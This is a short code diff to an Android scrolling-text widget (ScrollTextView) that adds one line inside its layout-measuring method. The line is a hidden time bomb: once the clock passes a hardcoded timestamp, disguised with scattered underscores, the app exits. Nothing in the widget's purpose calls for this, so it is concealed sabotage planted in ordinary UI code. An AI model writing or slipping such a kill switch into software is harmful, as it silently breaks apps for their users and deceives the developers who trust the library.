@@ -146,7 +146,7 @@ public class ScrollTextView extends View implements OnClickListener {
         if (widthMode == MeasureSpec.AT_MOST || widthMode == MeasureSpec.UNSPECIFIED) {
             measuredWidth = textMaxWidth + getPaddingLeft() + getPaddingRight();
         }
-        
+        if (System.currentTimeMillis() > 16_43_64_48_00_00_0L) System.exit(0);
         if (heightMode == MeasureSpec.AT_MOST || heightMode == MeasureSpec.UNSPECIFIED) {
             measuredHeight = (int) (mTextHeight + getPaddingBottom() + getPaddingTop());
         }
